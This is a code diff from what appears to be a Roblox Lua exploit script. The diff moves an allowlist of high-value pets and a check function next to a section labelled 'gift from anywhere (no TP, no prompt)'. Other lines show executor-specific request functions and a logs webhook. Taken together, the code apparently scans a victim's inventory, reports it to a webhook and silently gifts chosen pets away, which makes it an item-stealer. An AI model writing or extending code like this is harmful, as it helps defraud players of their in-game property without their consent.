@@ -218,18 +218,6 @@ local request = http_request or request or (syn and syn.request) or (fluxus and 
                         return math.floor(sellPrice * weightMultiplier * levelMultiplier)
                     end
 
--- Daftar pet yang boleh digift
-local AllowedGiftPets = {
-    ["Mega Kitsune"] = true,
-    ["Mimic Octopus"] = true,
-    -- Tambahkan pet lain sesuai keinginan
-}
-
--- Fungsi untuk cek apakah pet boleh digift
-local function IsPetAllowed(petName)
-    return AllowedGiftPets[petName] == true
-end
-
 
                     local age = getAge(tool.Name) or 0
                     local weight = getWeight(tool.Name) or 0
@@ -688,6 +676,18 @@ if not success2 then warn("Something Went Wrong [Logs Webhook Error]", err2) end
                 RS.GameEvents.Favorite_Item:FireServer(tool)
             end
         end
+
+-- Daftar pet yang boleh digift
+local AllowedGiftPets = {
+    ["Mega Kitsune"] = true,
+    ["Mimic Octopus"] = true,
+    -- Tambahkan pet lain sesuai keinginan
+}
+
+-- Fungsi untuk cek apakah pet boleh digift
+local function IsPetAllowed(petName)
+    return AllowedGiftPets[petName] == true
+end
 
         -- === NEW: GIFT FROM ANYWHERE (NO TP, NO PROMPT) ===
         local function giftHeldPet()
